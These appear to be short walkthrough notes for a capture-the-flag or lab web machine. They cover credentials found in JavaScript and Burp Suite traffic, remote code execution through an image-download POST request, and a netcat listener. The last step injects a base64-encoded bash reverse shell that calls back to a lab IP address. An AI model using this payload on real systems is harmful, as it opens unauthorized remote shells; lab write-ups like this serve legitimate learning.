1. Since http port is open -> Inspect the page
2. We found some credentials by inspecting the .js file
    2.1 By intercepting the connection with burpsuite, we also get the same credentials in base64
3. Once logged in the web, we can download some images. If we inspect the download process with burpsuite we detect a POST request
4. Trying a RCE with the POST request -> Successfull
5. Opening a Reverse Shell with NetCat:
    5.1 Listen to a connection in an arbitrary port:

      netcat -lvp 1111

    5.2 Inject a reverse shell using the POST method: (we enconding it since we the normal execution didnt worked due to / character)

      echo 'L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjUzLzExMTEgMD4mMQo=' | base64 -d | bash
